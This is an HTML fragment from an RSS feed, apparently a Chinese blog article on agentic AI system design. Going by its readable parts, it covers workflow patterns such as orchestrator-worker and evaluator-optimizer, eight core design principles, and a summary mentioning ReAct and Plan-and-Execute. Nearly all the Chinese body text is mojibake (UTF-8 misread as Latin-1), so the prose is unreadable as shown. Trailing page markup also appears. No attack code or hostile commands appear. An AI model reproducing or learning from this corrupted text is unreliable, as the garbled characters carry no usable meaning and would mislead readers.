<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afaf54dc1cf64779b686be1664ef6ffb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=JyQ2ldude9anX1LTLvf5lBcIRgI%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>æœ€é€‚åˆéœ€è¦åŠ¨æ€ä»»åŠ¡åˆ†è§£ä¸å®æ—¶è‡ªé€‚åº”è°ƒæ•´ï¼Œä¸”å­ä»»åŠ¡æ— æ³•é¢„å…ˆå®šä¹‰çš„åœºæ™¯ã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>æ ¹æ®éœ€æ±‚å˜æ›´çš„å…·ä½“å†…å®¹ï¼Œè‡ªåŠ¨ä¿®æ”¹ä»£ç åº“ä¸­çš„å¤šä¸ªæ–‡ä»¶ã€‚</li>
<li>ä»å¤šä¸ªä¿¡æ¯æºæ”¶é›†å¹¶æ•´åˆç›¸å…³æ•°æ®ï¼Œå¼€å±•å®æ—¶ç ”ç©¶å·¥ä½œã€‚</li>
</ul>
<h3 data-id="heading-10">5ã€è¯„ä¼°å™¨ - ä¼˜åŒ–å™¨æ¨¡å¼</h3>
<p>è¯„ä¼°å™¨ - ä¼˜åŒ–å™¨æ¨¡å¼çš„è¿è¡Œé€»è¾‘æ˜¯ï¼šå…ˆç”Ÿæˆåˆå§‹è¾“å‡ºå†…å®¹ï¼Œå†åŸºäºè¯„ä¼°æ¨¡å‹çš„åé¦ˆä¿¡æ¯å¯¹å…¶è¿›è¡Œè¿­ä»£ä¼˜åŒ–ï¼Œä»è€ŒæŒç»­æ”¹è¿›å†…å®¹è´¨é‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0edf7a8c10f34bf7b65ddc382f37252e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=xVHQ2P1jsvtVP73FH4Px5eIR6Es%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>é€‚ç”¨äºé€šè¿‡è¿­ä»£ä¼˜åŒ–èƒ½æ˜¾è‘—æå‡å“åº”è´¨é‡çš„ä»»åŠ¡ï¼Œå°¤å…¶åœ¨å­˜åœ¨æ˜ç¡®è¯„ä¼°æ ‡å‡†çš„åœºæ™¯ä¸­æ•ˆæœçªå‡ºã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>é€šè¿‡å¤šè½®è¯„ä¼°ä¸ä¼˜åŒ–å¾ªç¯ï¼Œå®Œå–„æ–‡å­¦æ–‡æœ¬çš„ç¿»è¯‘è´¨é‡ã€‚</li>
<li>æ‰§è¡Œå¤šè½®ç ”ç©¶æ£€ç´¢ä»»åŠ¡ï¼Œé€šè¿‡è¿­ä»£ä¼˜åŒ–æŒç»­ç²¾ç‚¼æœç´¢ç»“æœã€‚</li>
</ul>
<h2 data-id="heading-11">ä¸‰ã€Agentic AIç³»ç»Ÿæ ¸å¿ƒè®¾è®¡åŸåˆ™</h2>
<h3 data-id="heading-12">3.1 æ ¸å¿ƒè®¾è®¡åŸåˆ™</h3>
<p>Agentic AIç³»ç»Ÿè®¾è®¡åº”éµå¾ªä»¥ä¸‹å…«å¤§æ ¸å¿ƒåŸåˆ™ï¼š</p>
<h4 data-id="heading-13">1ã€è‡ªä¸»æ€§ä¸å¯æ§æ€§åŸåˆ™</h4>
<p>å¼€å‘è€…åº”æ ¹æ®å®é™…éœ€æ±‚å†³å®šæ˜¯è®©ç³»ç»Ÿè‡ªä¸»æ€§æ›´å¼ºä¸€äº›è¿˜æ˜¯å·¥ä½œæµç¨‹çš„å¯æ§æ€§æ›´å¼ºä¸€äº›ã€‚</p>
<h4 data-id="heading-14">2ã€æ¨¡å—åŒ–ä¸ç»„ä»¶åŒ–åŸåˆ™</h4>
<p>å°†æ™ºèƒ½ä½“ç³»ç»Ÿæ‹†è§£ä¸ºæ¾è€¦åˆã€å¯å¤ç”¨çš„åŠŸèƒ½æ¨¡å—ï¼Œå„æ¨¡å—ç‹¬ç«‹å°è£…èƒ½åŠ›ï¼Œä¾¿äºçµæ´»ç»„åˆã€å‡çº§ä¸ç»´æŠ¤ã€‚</p>
<h4 data-id="heading-15">3ã€åŠ¨æ€é€‚åº”æ€§åŸåˆ™</h4>
<p>ç³»ç»Ÿéœ€å…·å¤‡åº”å¯¹éç»“æ„åŒ–ã€å®æ—¶å˜åŒ–åœºæ™¯çš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿå¤„ç†è®­ç»ƒæ•°æ®å¤–çš„æ–°é—®é¢˜ã€æ–°è¾“å…¥ï¼Œè§£å†³ä¼ ç»Ÿ LLMâ€œçŸ¥è¯†è¿‡æ—¶ã€è¯­å¢ƒè„±èŠ‚â€ çš„ç—›ç‚¹ã€‚</p>
<h4 data-id="heading-16">4ã€å·¥å…·å¢å¼ºåŸåˆ™</h4>
<p>é€šè¿‡é›†æˆå¤–éƒ¨å·¥å…·ã€çŸ¥è¯†åº“ä¸è®¡ç®—èµ„æºï¼Œçªç ´æ™ºèƒ½ä½“è‡ªèº«é¢„è®­ç»ƒçŸ¥è¯†çš„å±€é™ï¼Œæ‹“å±•ç³»ç»Ÿçš„åŠŸèƒ½è¾¹ç•Œä¸é¢†åŸŸé€‚é…èƒ½åŠ›ã€‚</p>
<h4 data-id="heading-17">5ã€åä½œæ€§åŸåˆ™</h4>
<p>å¯¹äºå¤æ‚åœºæ™¯å¤æ‚ä»»åŠ¡ä¸‹çš„Agentic AIï¼Œé‡‡ç”¨å¤šæ™ºèƒ½ä½“åˆ†å·¥åä½œï¼Œé€šè¿‡ä»»åŠ¡åˆ†é…ã€ä¿¡æ¯å…±äº«ä¸ç»“æœæ•´åˆï¼Œå¯ä»¥å–å¾—å•æ™ºèƒ½ä½“æ— æ³•è¾¾æˆçš„æ•ˆæœã€‚</p>
<h4 data-id="heading-18">6ã€è¿­ä»£ä¼˜åŒ–åŸåˆ™</h4>
<p>å†…ç½®åæ€ä¸åé¦ˆæœºåˆ¶ï¼Œé€šè¿‡ â€œæ‰§è¡Œ - è¯„ä¼° - ä¼˜åŒ–â€ çš„é—­ç¯æµç¨‹ï¼ŒæŒç»­æå‡ä»»åŠ¡æ‰§è¡Œçš„å‡†ç¡®æ€§ä¸æ•ˆç‡ã€‚</p>
<h4 data-id="heading-19">7ã€å¯è§£é‡Šæ€§åŸåˆ™</h4>
<p>æ™ºèƒ½ä½“çš„å†³ç­–è¿‡ç¨‹ä¸è¾“å‡ºç»“æœéœ€é€æ˜å¯è¿½æº¯ï¼Œä¾¿äºç”¨æˆ·ç†è§£ã€è°ƒè¯•ä¸ä¿¡ä»»ï¼Œå°¤å…¶é€‚ç”¨äºåŒ»ç–—ã€æ³•å¾‹ã€é‡‘èç­‰é«˜å±é¢†åŸŸã€‚</p>
<h4 data-id="heading-20">8ã€èµ„æºä¼˜åŒ–ä¸å¯æ‰©å±•æ€§åŸåˆ™</h4>
<p>åœ¨ä¿è¯ç³»ç»Ÿæ€§èƒ½çš„å‰æä¸‹ï¼Œåˆç†åˆ†é…è®¡ç®—èµ„æºï¼Œå¹¶æ”¯æŒéšç€ä»»åŠ¡è§„æ¨¡å¢é•¿å¹³æ»‘æ‰©å±•ï¼Œé¿å…èµ„æºæµªè´¹æˆ–ç³»ç»Ÿå´©æºƒã€‚</p>
<h3 data-id="heading-21">3.2 è®¾è®¡åŸåˆ™ä¹‹é—´çš„ååŒå…³ç³»</h3>
<p>Agentic AIç³»ç»Ÿçš„å…«å¤§æ ¸å¿ƒè®¾è®¡åŸåˆ™å¹¶éå­¤ç«‹å­˜åœ¨ï¼Œè€Œæ˜¯ç›¸äº’æ”¯æ’‘ã€ååŒä½œç”¨ï¼š</p>
<ul>
<li>è‡ªä¸»å¯æ§ + æ¨¡å—åŒ– æ˜¯ç³»ç»Ÿçš„æ ¸å¿ƒæ¶æ„åŸºç¡€ï¼›</li>
<li>åŠ¨æ€é€‚åº”æ€§ + å·¥å…·å¢å¼º æ‹“å±•ç³»ç»Ÿçš„èƒ½åŠ›è¾¹ç•Œï¼›</li>
<li>åä½œæ€§ + è¿­ä»£ä¼˜åŒ– æå‡å¤æ‚ä»»åŠ¡çš„å¤„ç†æ•ˆç‡ä¸è´¨é‡ï¼›</li>
<li>å¯è§£é‡Šæ€§ + èµ„æºä¼˜åŒ– ä¿éšœç³»ç»Ÿçš„å¯é æ€§ä¸å®ç”¨æ€§ã€‚</li>
</ul>
<h2 data-id="heading-22">å››ã€æ€»ç»“</h2>
<ul>
<li>
<p>æ™ºèƒ½ä½“å››å¤§åŸºç¡€è®¾è®¡æ¨¡å¼ï¼šåæ€ã€è§„åˆ’ã€å·¥å…·è°ƒç”¨ã€å¤šæ™ºèƒ½ä½“åä½œã€‚</p>
</li>
<li>
<p>å·¥ä½œæµäº”å¤§åŸºç¡€è®¾è®¡æ¨¡å¼ï¼šæç¤ºé“¾ã€è·¯ç”±ã€å¹¶è¡Œã€åè°ƒå™¨ - æ‰§è¡Œè€…ã€è¯„ä¼°å™¨ - ä¼˜åŒ–å™¨ã€‚</p>
</li>
<li>
<p>æ™ºèƒ½ä½“å’Œå·¥ä½œæµæ„æˆAgentic AIç³»ç»Ÿçš„åŸºç¡€ï¼Œé‚£ä¹ˆæ™ºèƒ½ä½“å’Œå·¥ä½œæµçš„è¿™ä¹ç§è®¾è®¡æ¨¡å¼åˆ™æ„æˆAgentic AIç³»ç»Ÿè®¾è®¡çš„åŸºç¡€ã€‚å¼€å‘è€…å¯ä»¥çµæ´»é€‰æ‹©å’Œç»„åˆå®ƒä»¬æ¥æ„å»ºç¬¦åˆå®é™…åœºæ™¯éœ€è¦çš„æ™ºèƒ½ä½“åŒ–AIç³»ç»Ÿã€‚</p>
</li>
<li>
<p>ç»å…¸çš„æ™ºèƒ½ä½“è®¾è®¡æ¨¡å¼ReActæ¨¡å¼ã€Plan and Executeæ¨¡å¼ã€ä»¥åŠå¤šæ™ºèƒ½ä½“çš„ä¸»ç®¡åˆ†æ´¾æ¨¡å¼ã€å¹³ç­‰äº¤æ¥æ¨¡å¼ï¼Œæœ¬è´¨ä¸Šéƒ½æ˜¯å¯¹è¿™äº›åŸºç¡€è®¾è®¡æ¨¡å¼çš„ç»„åˆè¿ç”¨ã€‚æ‰€ä¸åŒçš„åªæ˜¯åŸºç¡€æ¨¡å¼é’ˆå¯¹å•ä¸€ä»»åŠ¡å’ŒåŸºç¡€åœºæ™¯çš„å¤„ç†æ¨¡å¼æŠ½è±¡ï¼Œç»„åˆæ¨¡å¼æ˜¯é’ˆå¯¹å¤åˆä»»åŠ¡å’Œå¤æ‚åœºæ™¯çš„å¤„ç†æ¨¡å¼æŠ½è±¡ã€‚</p>
</li>
<li>
<p>Agentic AIç³»ç»Ÿè®¾è®¡åº”æ ¹æ®å®é™…éœ€æ±‚ï¼Œéµå¾ªå…«å¤§æ ¸å¿ƒè®¾è®¡åŸåˆ™ï¼Œçµæ´»é€‰æ‹©å’Œç»„åˆä½¿ç”¨åŸºç¡€è®¾è®¡æ¨¡å¼ã€‚</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>